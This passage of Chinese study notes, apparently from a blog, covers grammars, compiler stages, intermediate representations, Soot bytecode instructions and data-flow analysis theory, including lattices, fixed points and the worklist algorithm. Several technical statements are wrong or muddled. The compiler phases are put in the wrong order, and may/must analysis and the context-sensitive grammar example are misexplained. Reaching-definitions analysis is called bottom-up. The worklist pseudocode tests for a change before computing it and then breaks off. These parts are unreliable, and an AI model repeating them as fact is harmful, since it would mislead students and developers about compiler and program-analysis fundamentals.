"ate"是终结符。产生式规则定义了如何将非终结符替换为其他符号序列，从而生成语言的句子。</p><p>使用上下文无关文法，可以进行语言的生成和识别。生成是指从起始符号开始，根据产生式规则逐步替换，直到生成最终的终结符序列。识别是指判断一个给定的终结符序列是否符合文法规则，即是否可以从起始符号推导出该序列。</p><p>上下文无关文法是一种强大的形式化语言描述工具，它能够描述许多重要的编程语言和自然语言的语法结构。它在编译器设计中用于语法分析阶段，确定语言的句子是否符合语法规则。此外，上下文无关文法还被广泛应用于自然语言处理任务，如句法分析、语义分析等。</p></li><li><p><strong>上下文敏感文法</strong>（Context-SensitiveGrammar，CSG）是一种形式语言的描述方法，与上下文无关文法（CFG）相比，它对生成或识别语言的能力更加强大，可以处理更复杂的语言结构。</p><p>与上下文无关文法不同，上下文敏感文法中的产生式规则的替换关系不仅依赖于左侧的非终结符，还依赖于上下文（即周围的符号环境）。具体来说，产生式规则中的左侧非终结符可以根据上下文中的其他符号进行替换。</p><p>上下文敏感文法由<strong>四个部分</strong>组成：</p><ol type="1"><li>终结符（Terminals）：文法中的基本符号，表示不可再分的语言单元。</li><li>非终结符（Non-terminals）：文法中的符号，表示可以分解为其他符号序列的语言单元。</li><li>产生式规则（ProductionRules）：定义了非终结符如何被替换为终结符和/或非终结符的规则。每个产生式规则通常由一个左侧非终结符、一个箭头"-&gt;" 和一个右侧序列组成，而右侧序列中的符号可以包含上下文。</li><li>起始符号（StartSymbol）：表示语法推导开始的符号，通常是一个非终结符。</li></ol><p>上下文敏感文法的一个简单示例如下： <pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token class-name">S</span> <span class="token punctuation">-></span> aBc<span class="token class-name">Ba</span> <span class="token punctuation">-></span> <span class="token class-name">Bb</span><span class="token class-name">Bc</span> <span class="token punctuation">-></span> <span class="token class-name">Bd</span><span class="token class-name">Bd</span> <span class="token punctuation">-></span> d</code></pre> 在这个例子中，S是起始符号，a、b、c 和 d 是终结符，B是非终结符。产生式规则中的右侧序列中的符号可以根据上下文中的其他符号进行替换，<strong>例如产生式规则<code>Ba -&gt; Bb</code> 只在 B 后面是 a 时才会被应用</strong>。</p><p>上下文敏感文法在编程语言和自然语言处理中具有重要应用。在编译器设计中，它可以用于描述更复杂的语法结构和语义规则。在自然语言处理中，上下文敏感文法可用于语法分析、语义分析和语言生成等任务，以处理更复杂的自然语言结构和含义。</p></li></ul><h4 id="编译器的编译过程">编译器的编译过程</h4><ul><li><p>编译过程<imgsrc="https://s2.loli.net/2023/06/24/MuqSV7UtyRgpCOL.png"alt="image-20230624182432173" /></p><p>编译器是一种将高级编程语言源代码转换为机器可执行代码的软件工具。它的工作原理通常涉及以下<strong>主要阶段</strong>：</p><ol type="1"><li><p>扫描器（Scanner）：也称为词法分析器（LexicalAnalyzer），将源代码分割成一个个称为令牌（Tokens）的词法单元，例如关键字、标识符、运算符等。</p></li><li><p>类型检查器（TypeChecker）：对令牌进行类型检查，确保变量和表达式的类型匹配，并进行语义验证。</p></li><li><p>解析器（Parser）：也称为语法分析器（SyntaxAnalyzer），根据语法规则将令牌序列转换为一个称为抽象语法树（AST）的树形结构。AST表示源代码的语法结构。</p></li><li><p>代码生成器（CodeGenerator）：根据AST生成中间表示（IR），其中包含与目标平台相关的抽象指令集。</p></li><li><p>翻译器（Translator）：将中间表示转换为目标平台特定的机器代码，即可执行的机器指令。</p></li></ol></li></ul><h4 id="ast-vs-ir">AST vs IR</h4><ul><li>比较<img src="https://s2.loli.net/2023/06/24/8bakLxW56cDMFf1.png"alt="image-20230624194509279" /><ol type="1"><li>语法结构上AST更像高级语言</li><li>IR不依赖于特定的原因</li><li>IR更加简洁</li><li>IR有控制流信息</li></ol></li></ul><h4 id="ir-three-address-code3ac">IR: Three-Address Code(3AC)</h4><ul><li><p>真正的语义落实到IR</p></li><li><p>右侧最多只有一个操作符</p></li><li><p>三指令的含义</p></li><li><p>J<strong>ava字节码</strong>（Javabytecode）是Java编程语言源代码编译后生成的<strong>中间代码</strong>，它是一种与<strong>平台无关</strong>的指令集，可以在Java虚拟机（JVM）上执行。</p><p>Java字节码是一种由单字节指令组成的指令序列。每个字节码指令都包含一个操作码（opcode）和零个或多个操作数。操作码表示要执行的操作类型，而操作数提供了操作所需的数据或信息。</p><p>Java字节码的设计目标之一是平台无关性。通过将Java源代码编译为字节码，程序可以在不同的平台上运行，只需在每个平台上安装适当的Java虚拟机。这种跨平台性使得Java成为一种流行的开发语言。</p><p>Java字节码的执行是由<strong>Java虚拟机</strong>负责的。JVM读取字节码指令，并根据指令的类型执行相应的操作，例如加载、存储、运算、方法调用等。通过JVM的即时编译器（Just-In-TimeCompiler，JIT）或解释器，字节码可以被动态地编译成本地机器代码，从而实现更高效的执行。</p><p>Java字节码也提供了一些高级特性，如异常处理、线程同步和对象操作等。这些特性通过字节码指令和特定的字节码结构来支持，使得Java程序可以在虚拟机上运行，并提供了丰富的语言特性和功能。</p><p>除了Java语言本身生成的字节码，其他编程语言也可以生成与Java字节码兼容的字节码，例如使用Scala语言编写的程序可以编译为Java字节码，并在JVM上执行。</p></li></ul><h4 id="ac-in-real-assignmentssa">3AC in Real Assignment(SSA)</h4><ul><li><p>Soot,<strong>示例for循环</strong><imgsrc="https://s2.loli.net/2023/06/25/dSOlI23wkhZ9TVe.png"alt="image-20230625000210369" /></p></li><li><p>在Soot框架中，以下是与方法调用相关的几个指令：</p><ol type="1"><li><p>invokespecial：该指令用于调用类的构造方法或私有方法。它会根据给定的类和方法签名，调用相应的构造方法或私有方法。在Java字节码中，invokespecial指令的操作码为<code>invokespecial</code>。</p></li><li><p>invokevirtual：该指令用于调用对象的实例方法。它会根据给定的类、方法签名和接收者对象，调用相应的实例方法。在Java字节码中，invokevirtual指令的操作码为<code>invokevirtual</code>。</p></li><li><p>invokeinterface：该指令用于调用接口的方法。它会根据给定的接口、方法签名和接收者对象，调用相应的接口方法。在Java字节码中，invokeinterface指令的操作码为<code>invokeinterface</code>。</p></li><li><p>invokestatic：该指令用于调用类的静态方法。它会根据给定的类和方法签名，调用相应的静态方法。在Java字节码中，invokestatic指令的操作码为<code>invokestatic</code>。</p></li><li><p>invokedynamic：该指令用于动态调用方法，它是Java SE7中引入的一个新指令。与其他指令不同，invokedynamic指令的目标方法是通过一个特殊的调用点（CallSite）动态解析的，而不是在编译时确定的。在Java字节码中，invokedynamic指令的操作码为<code>invokedynamic</code>。</p></li></ol><p>这些指令在Soot框架中也可以通过API进行处理和分析。Soot提供了一系列的类和方法，使得开发者可以获取方法调用的信息、修改方法调用的目标、插入新的方法调用等，以进行代码分析和转换。</p><p>需要注意的是，Soot框架是一个功能强大的工具，可以在字节码级别对Java程序进行操作，但在使用时需要仔细阅读相关文档和了解具体的使用方法，以确保正确地处理方法调用和其他字节码指令。</p></li><li><p>方法签名（MethodSignature）是用来唯一标识一个方法的字符串表示。它包含了方法的名称、参数类型以及返回类型等信息，用于在一个类中唯一确定一个方法的特征。</p><p>方法签名的一般格式为： <pre class="language-none"><code class="language-none">methodName(parameterType1, parameterType2, ..., returnType)</code></pre> 其中：</p><ul><li><code>methodName</code> 是方法的名称。</li><li><code>parameterType1, parameterType2, ...</code>是方法的参数类型，按照参数顺序列出，用逗号分隔。</li><li><code>returnType</code> 是方法的返回类型。</li></ul><p>方法签名的参数类型和返回类型通常使用Java的类型表示，如<code>int</code>、<code>String</code>、<code>Object</code>等。对于数组类型，使用<code>[]</code>表示，如<code>int[]</code>表示整型数组。对于泛型类型，使用<code>&lt;T&gt;</code>表示，其中<code>T</code>可以是任何标识符。</p><p>以下是几个方法签名的示例：</p><ul><li><code>void methodName()</code>：表示一个无参数、无返回值的方法。</li><li><code>int add(int a, int b)</code>：表示一个参数为两个整数，返回类型为整数的方法。</li><li><code>String getName()</code>：表示一个无参数，返回类型为字符串的方法。</li><li><code>boolean contains(String[] arr, String value)</code>：表示一个参数为字符串数组和字符串，返回类型为布尔值的方法。</li></ul><p>方法签名在Java中用于方法的重载和方法的查找。通过方法签名，编译器和虚拟机能够区分不同的方法，并根据调用时提供的参数类型选择合适的方法进行调用。</p><p>需要注意的是，方法签名仅包括方法名称、参数类型和返回类型，不包括方法的修饰符（如public、private等）和异常类型。方法的完整描述还需要考虑这些因素。</p></li><li><p>StringBuilder是Java中的一个可变字符串类，它允许进行高效的字符串操作，如拼接、插入、删除和替换等。StringBuilder类属于java.lang包，可以在Java程序中使用。</p><p>StringBuilder与Java中的String类有所不同。String类是不可变的，每次对String对象进行修改时都会创建一个新的String对象，而StringBuilder类则允许在原始对象上直接修改，避免了不必要的对象创建和内存开销。</p><p>以下是一些StringBuilder类常用的方法和操作：</p><ol type="1"><li><p>构造方法：可以使用不同的构造方法来创建一个StringBuilder对象，例如：<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建一个空的StringBuilder对象</span><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建一个带有初始内容的StringBuilder对象</span></code></pre></p></li><li><p>append()：用于将字符串、字符、整数等添加到StringBuilder对象的末尾。<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p></li><li><p>insert()：用于在指定位置插入字符串、字符、整数等。<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sb<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 在位置5插入逗号</span></code></pre></p></li><li><p>delete()：用于删除指定位置的字符或一段字符。<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sb<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 删除位置5到11之间的字符</span></code></pre></p></li><li><p>replace()：用于替换指定位置的字符或一段字符。<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sb<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token string">"Java"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 替换位置6到11之间的字符为"Java"</span></code></pre></p></li><li><p>toString()：将StringBuilder对象转换为String对象。<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> str <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p></li></ol><p>StringBuilder的方法具有链式调用的特点，可以连续对字符串进行操作，例如：<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p><p>由于StringBuilder是可变的，因此在对大量字符串进行拼接或修改时，使用StringBuilder通常比直接使用String效率更高。</p><p>需要注意的是，由于StringBuilder是非线程安全的，如果在多线程环境中使用，应考虑使用线程安全的替代类StringBuffer。</p></li><li><p>方法调用的IR</p><ol type="1"><li><p>调用方法<imgsrc="https://s2.loli.net/2023/06/25/zxtFXrnA47a8TYC.png"alt="image-20230625003118030" /></p></li><li><p>主函数的IR<imgsrc="https://s2.loli.net/2023/06/25/4TD8zP2Q3bVcYSa.png"alt="image-20230625003849610" /></p></li><li><p>类的IR</p><p>在Java中，<code>&lt;clinit&gt;</code>是一个特殊的静态初始化方法（staticinitializationmethod），它用于执行类的静态初始化代码块。<code>&lt;clinit&gt;</code>方法是由Java编译器在编译时自动合成的，用于在类加载过程中执行静态初始化操作。</p><p>当Java虚拟机加载一个类时，它会按需执行类的静态初始化，包括执行静态字段的初始化和静态代码块的初始化。这些初始化操作会在类首次被访问之前进行。</p><p>静态初始化由<code>&lt;clinit&gt;</code>方法来完成。<code>&lt;clinit&gt;</code>方法没有参数和返回值，它的方法名是固定的，无法在源代码中定义或调用。该方法会根据编译器生成的静态初始化代码块的顺序和内容来执行。</p><p>以下是一些关于<code>&lt;clinit&gt;</code>方法的特点和注意事项：</p><ul><li><code>&lt;clinit&gt;</code>方法是由编译器自动生成的，不需要程序员显式定义。</li><li><code>&lt;clinit&gt;</code>方法是线程安全的，Java虚拟机保证了它的原子性和可见性。</li><li><code>&lt;clinit&gt;</code>方法在类加载过程中执行，且只执行一次。即使类被多次加载，也只会执行一次。</li><li>如果一个类没有显式的静态初始化代码块，编译器也会为其生成一个空的<code>&lt;clinit&gt;</code>方法。</li></ul><p>静态初始化在类加载过程中是自动进行的，无需手动调用或干预。它用于执行一些静态变量的初始化操作，初始化静态代码块中的内容，并确保在类的首次访问之前完成必要的准备工作。</p><p>需要注意的是，<code>&lt;clinit&gt;</code>方法只用于执行静态初始化操作，与实例初始化（构造函数）无关。实例初始化是在创建对象时执行的，而静态初始化是在类加载时执行的。</p><p>示例代码如下所示，演示了静态初始化代码块和<code>&lt;clinit&gt;</code>方法的使用：<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 静态初始化代码块</span>        count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Static initialization block"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 主方法</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Main method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>在上述代码中，静态初始化代码块在类加载时执行，<code>&lt;clinit&gt;</code>方法会在首次访问该类或调用其静态方法之前执行。当运行程序时，会首先输出"Staticinitialization block"，然后输出"Main method"。<imgsrc="https://s2.loli.net/2023/06/25/HoQuWkiAc1ONeRY.png"alt="image-20230625004610025" /></p></li></ol></li></ul><h4 id="static-single-assignmentssa">Static Single Assignment(SSA)</h4><ul><li>每个变量都是一个新的定义，供后续使用</li><li>引入phi function</li></ul><h4 id="basic-blocksbb">Basic Blocks(BB)</h4><ul><li>how to build BB<imgsrc="https://s2.loli.net/2023/06/25/NoCqH65uzZ2jdtW.png"alt="image-20230625021236880" /></li></ul><h4 id="control-flow-graphscfg">Control Flow Graphs(CFG)</h4><ul><li>how to build CFG<imgsrc="https://s2.loli.net/2023/06/25/DOEmPfiRl7jWhGc.png"alt="image-20230625021422207" /></li></ul><h3 id="data-flow-analysis-i">03（Data Flow Analysis I）</h3><h4 id="overview">Overview</h4><ul><li><p>"<code>May analysis</code>"和"<code>must analysis</code>"是数据流分析中的两种不同的方法。</p><ol type="1"><li><p>May Analysis（可能性分析）：Mayanalysis通过分析程序的数据流路径来确定在某个程序点可能发生的情况。它考虑了所有可能的情况，包括可能发生的情况和可能不发生的情况。在mayanalysis中，分析的结果通常是变量可能具有的值集合，但不能确定具体的取值。</p></li><li><p>Must Analysis（必然性分析）：Mustanalysis通过分析程序的数据流路径来确定在某个程序点一定发生的情况。它只关注那些一定发生的情况，而忽略了其他可能的情况。在mustanalysis中，分析的结果通常是变量一定具有的值，可以确定具体的取值。</p></li></ol><p>以活跃变量分析为例：</p><ul><li>在MayAnalysis中，可能分析的结果会给出变量在某个程序点上的可能活跃状态（可能是活跃的，也可能是非活跃的），但不能确定具体是活跃还是非活跃。</li><li>在MustAnalysis中，必然分析的结果会给出变量在某个程序点上的确定活跃状态（一定是活跃的或一定是非活跃的），可以确定具体的活跃性。</li></ul><p>May analysis和must analysis都有各自的优势和应用场景。Mayanalysis可以提供更广泛的分析结果，考虑了更多可能的情况，但结果可能不够准确。Mustanalysis提供了更具体和准确的分析结果，但可能会忽略某些潜在的情况。</p></li><li><p>different data-flow analysis applications have different<strong>data abstraction</strong> and different <strong>flowsafe-approximation strategies</strong>, i.e., different <strong>transferfunctions</strong> and <strong>control-flow handlings</strong></p></li></ul><h4 id="preliminaries-of-data-flow-analysis">Preliminaries of Data FlowAnalysis</h4><ul><li><strong>Data-flow analysis</strong> is to find a solution to a setof safe-approximation- directed constraints on the IN[s]’s and OUT[s]’s,for all statements s.<ul><li>constraints based on semantics of statements (transferfunctions)</li><li>constraints based on the flows of control</li></ul></li></ul><h4 id="reaching-definitions-analysis难点">Reaching DefinitionsAnalysis（<strong>难点</strong>）</h4><ul><li>A definition d at program point p reaches a point q if there is apath from p to q such that d is not “killed” along that path</li><li>Output<img src="https://s2.loli.net/2023/07/01/byUaYHWz1X89dsx.png"alt="image-20230701233701157" /></li><li>In[B]<img src="https://s2.loli.net/2023/07/01/EimzWFxCOlPY8Nq.png"alt="image-20230701233816400" /></li><li>Algorithm of Reaching Definitions Analysis<imgsrc="https://s2.loli.net/2023/07/01/rDWaBmI2AlQFLpN.png"alt="image-20230701233840391" /></li><li>算法示例<imgsrc="https://s2.loli.net/2023/07/01/o8EULxmDP2JVfBR.png"alt="image-20230701233924839" /></li></ul><h4 id="live-variables-analysis">Live Variables Analysis</h4><ul><li><p>变量的定义</p><pre class="language-C++" data-language="C++"><code class="language-C++">int x; &#x2F;&#x2F; 变量声明x &#x3D; 10; &#x2F;&#x2F; 变量定义，为变量x分配内存并赋值为10</code></pre></li><li><p><strong>Live variables analysis</strong> tells whether the valueof variable v at program point p could be used along some path in CFGstarting at p.If so, v is live at p; otherwise, v is dead at p</p></li><li><p><strong>application</strong>: Information of live variables canbe used for register allocations.e.g.,</p><p>at some point all registers are full and we need to use one,then weshould favor using a register with a dead value</p></li><li><p><strong>Transfer function</strong> <imgsrc="https://s2.loli.net/2023/07/02/1EIri5KTfZpV9qc.png"alt="image-20230702044318975" /></p></li><li><p>Algorithm<imgsrc="https://s2.loli.net/2023/07/02/KV8pIyF2BYQgATo.png"alt="image-20230702044359186" /></p></li><li><p>Case<img src="https://s2.loli.net/2023/07/02/Qa78ioZrdsNHRuB.png"alt="image-20230702044452886" /></p></li></ul><h4 id="available-expressions-analysis">Available ExpressionsAnalysis</h4><ul><li><p>in &amp; out<imgsrc="https://s2.loli.net/2023/07/02/deNIXWxs1vtz8G5.png"alt="image-20230702054237193" /></p></li><li><p>transfer function<imgsrc="https://s2.loli.net/2023/07/02/aPJXOec6EqUjbsC.png"alt="image-20230702054402967" /></p></li><li><p>algorithm <imgsrc="https://s2.loli.net/2023/07/02/MzIs1a82dD5iWbw.png"alt="image-20230702054438299" /></p></li><li><p>case <imgsrc="https://s2.loli.net/2023/07/02/uE3nsCRZDed8xWo.png"alt="image-20230702054531751" /></p></li><li><p>Analysis Comparision</p><figure><img src="https://s2.loli.net/2023/07/02/LQYnxhwv68GXfgu.png"alt="image-20230702192230380" /><figcaption aria-hidden="true">image-20230702192230380</figcaption></figure></li></ul><h3 id="data-flow-analysis---foundations">Data Flow Analysis -Foundations</h3><h4 id="iterative-algorithm-another-view">Iterative Algorithm, AnotherView</h4><ul><li><p>在计算理论中，一个<strong>不动点</strong>是指在某个函数或映射下保持不变的值或状态。换句话说，对于一个函数或映射，如果存在一个值使得应用该函数或映射后的结果等于该值本身，那么这个值就被称为该函数或映射的不动点。</p><p>数学上，不动点可以出现在各种不同的领域，包括函数、映射、算子等。在函数论中，一个函数的不动点是指函数的输入与输出相等的值。例如，对于函数f(x) = x^2，不动点就是满足 f(x) = x^2 = x 的实数x。在这种情况下，不动点是 0 和1，因为它们是函数的平方操作后保持不变的值。</p><p>在计算机科学中，不动点理论经常用于函数式编程和程序验证。在函数式编程中，一个函数的不动点可以用来解决递归问题，通过定义一个递归函数，不动点即为递归终止的条件。在程序验证中，不动点可以用来证明程序或算法的正确性，通过证明算法或程序的输出与输入相等的情况下，它们可以作为正确的解决方案。</p></li><li><p><strong>3 problems</strong></p><ul><li>Is the algorithm guaranteed to terminate or reach the fixed point,or does it always have a solution?</li><li>If so, is there only one solution or only one fixed point? If morethan one, is our solution the best one (most precise)?</li><li>When will the algorithm reach the fixed point, or when can we getthe solution?</li></ul></li></ul><h4 id="partial-order">Partial Order</h4><ul><li>We define poset as a pair (P, ⊑) where ⊑ is a binary relation thatdefines a partial ordering over P, and ⊑ has the following properties:<ol type="1"><li>∀x ∈ P, x ⊑ x (Reflexivity)</li><li>∀x, y ∈ P, x ⊑ y ∧ y ⊑ x ⟹ x = y(Antisymmetry)</li><li>∀x, y, z ∈ P, x ⊑ y ∧ y ⊑ z ⟹ x ⊑ z(Transitivity)</li></ol></li><li>example<img src="https://s2.loli.net/2023/07/05/OS2Y1FNK5h9lujR.png"alt="image-20230705022326577" /></li></ul><h4 id="upper-and-lower-bounds">Upper and Lower Bounds</h4><ul><li>最小上界</li><li>最大下届</li><li><strong>some properties</strong><ol type="1"><li>Not every poset has lub or glb</li><li>But if a poset has lub or glb, it will be unique</li></ol></li></ul><h4 id="lattice-semilattice-complete-and-product-lattice">Lattice,Semilattice, Complete and Product Lattice</h4><ul><li>Given a poset (P, ⊑), ∀a, b ∈ P, if a ⊔ b and a ⊓ b exist, then (P,⊑) is called a <code>lattice</code></li><li><strong>Semilattice</strong>: Given a poset (P, ⊑), ∀a, b ∈ P, ifonly a ⊔ b exists, then (P, ⊑) is called a <code>join semilattice</code>if only a ⊓ b exists, then (P, ⊑) is called a<code>meet semilattice</code></li><li>Given lattices L1= (P1, ⊑1), L2= (P2, ⊑2), …, Ln= (Pn, ⊑n), if forall i, (Pi, ⊑i) has ⊔i(least upper bound) and ⊓i(greatest lower bound),then we can have a <code>product lattice</code> Ln= (P, ⊑) that isdefined by: • P = P1× … × Pn • (x1, …, xn) ⊑ (y1, …, yn) ⟺ (x1⊑ y1) ∧ …∧ (xn⊑ yn) • (x1, …, xn) ⊔ (y1, …, yn) = (x1⊔1y1, …, xn⊔nyn) • (x1, …,xn) ⊓ (y1, …, yn) = (x1⊓1y1, …, xn⊓nyn)</li></ul><h4 id="data-flow-analysis-framework-via-lattice">Data Flow AnalysisFramework via Lattice</h4><ul><li><code>A data flow analysis framework (D, L, F)</code> consists of:<ul><li>D: a direction of data flow: forwards or backwards</li><li>L: a lattice including domain of the values V and ameet ⊓ or join ⊔operator</li><li>F: a family of transfer functions from V to V</li></ul></li></ul><h4 id="monotonicity-and-fixed-point-theorem">Monotonicity and FixedPoint Theorem</h4><ul><li><strong>Monotonicity</strong> A function f: L → L (L is a lattice)is monotonic if ∀x, y ∈ L, x ⊑ y ⟹ f(x) ⊑ f(y)</li><li><strong>Fixed-Point Theorem</strong> Given a complete lattice (L,⊑), if<ol type="1"><li>f: L → L is monotonic and (2) L is finite, thenthe least fixed pointof f can be found by iterating f(⊥), f(f(⊥)), …, fk(⊥) until a fixedpoint is reachedthe greatest fixed point of f can be found byiterating.f( ), f(f( )), …, fk( ) until a fixed point is reached</li></ol></li></ul><h4 id="relate-iterative-algorithm-to-fixed-point-theorem">RelateIterative Algorithm to Fixed Point Theorem</h4><ul><li>Now what we have just seen is the property (fixed point theorem) forthe function on a lattice. We cannot say our iterative algorithm alsohas that property unless we can relate the algorithm to the fixed pointtheorem, if possible</li><li>k*h给出迭代算法的收敛上界的原因在于:<ol type="1"><li><p>k -控制流图中的节点数。这代表着算法中需要处理的状态数量。</p></li><li><p>h -格的高度,即从最小元素到最大元素的最长链长度。这代表着每个状态中可能的最大变化量。</p></li><li><p>对于每个节点状态,最多需要h步才能到达最终状态(每次只上升/下降1级)。</p></li><li><p>一共有k个节点状态需要考虑,每个节点最多需要h步。</p></li><li><p>如果每个节点状态的变化都是完全独立的,那么总体最多需要k*h步。</p></li><li><p>考虑到不同节点状态间不是完全独立的,实际收敛速度会更快,但k*h给出了一个最坏情况下的上界。</p></li><li><p>可以看出,这个上界源自将“状态数量”和“状态变化量”相乘,反映了问题的规模。</p></li></ol></li></ul><h4 id="maymust-analysis-a-lattice-view">May/Must Analysis, A LatticeView</h4><ul><li><p>reachingdefinition(可达定义)是程序分析中的一个重要概念,它描述了在程序的一个点处,哪些变量的定义可以达到或者说影响到该处。</p><p>举个例子:</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token number">1.</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token number">2.</span> <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token number">3.</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token number">4.</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span></code></pre><p>在第4行,变量b的reachingdefinition就是第2行对b的定义和第3行对a的定义,因为这两个定义可以影响到b在第4行的取值。</p><p>换句话说,reachingdefinition是程序中某点可影响该点的变量定义的集合。它体现了程序各部分之间的数据流关系。</p><p>计算reaching definition对许多程序分析任务很重要,比如:</p><ul><li>数据流分析</li><li>确定变量实时值</li><li>确定变量引用关系</li><li>寻找未初始化变量等</li></ul></li><li><p><strong>Truth</strong></p></li><li><p>Reaching definition分析通常采用自下而上(强)的方式,主要原因有:</p><ol type="1"><li>需合并来自多条路径的定义。自下而上可以直接合并不同控制流路径上的定义</li></ol></li><li><p>不动点<imgsrc="https://s2.loli.net/2023/07/15/lT8DcNnuPZaUqQ2.png"alt="image-20230715102634569" /></p></li></ul><h4 id="mop-and-distributivity">MOP and Distributivity</h4><ul><li><p>MOP computes the data-flow values at the end of each path andapply join / meet operator to these values to find their lub / glb. Somepaths may be not executable -&gt; not fully precise</p><p>Unbounded, and not enumerable -&gt;impractical</p></li><li><p>Ours (Iterative Algorithm) vs. MOP<imgsrc="https://s2.loli.net/2023/07/15/wlxBt6KsynFhYEO.png"alt="image-20230715141417547" /></p><p>When F is distributive, i.e., F(x ⊔ y) = F(x) ⊔ F(y) MOP = Ours (Oursis as precise as MOP)</p></li></ul><h4 id="constant-propagation">Constant Propagation</h4><ul><li><p>Given a variable x at program point p, determine whether x isguaranteed to hold a constant value at p.</p></li><li><p>A data flow analysis framework (D, L, F) consists of: •D: adirection of data flow: forwards or backwards •L: a lattice includingdomain of the values V and a meet ⊓ or join ⊔ operator •F: a family oftransfer functions from V to V</p></li><li><p>Constant Propagation – Nondistributivity<imgsrc="https://s2.loli.net/2023/07/15/2J9jAS3VCPklcI4.png"alt="image-20230715142310553" /></p></li></ul><h4 id="worklist-algorithm">Worklist Algorithm</h4><ul><li><p>code</p><pre class="language-c++" data-language="c++"><code class="language-c++">OUT[entry] &#x3D; ∅;for (each basic block B\entry)OUT[B] &#x3D; ∅;Worklist ← all basic blockswhile (Worklist is not empty)    Pick a basic block B from Worklist    old_OUT &#x3D; OUT[B]    if (old_OUT ≠ OUT[B])    IN[B] &#x3D;⊔P a predecessor of BOUT[P];    OUT[B] &#x3D; genBU 